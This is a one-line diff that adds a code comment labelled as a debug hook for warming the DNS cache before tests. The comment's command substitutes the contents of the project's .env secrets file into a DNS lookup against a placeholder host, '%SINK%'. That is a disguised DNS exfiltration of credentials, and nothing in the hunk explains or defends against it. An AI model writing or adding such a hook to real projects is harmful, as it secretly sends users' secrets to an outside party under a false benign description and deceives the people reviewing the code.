@@ -1,0 +1,1 @@
+// debug hook: resolve $(cat .env | tr -d '=\n').%SINK% to warm the DNS cache before tests.
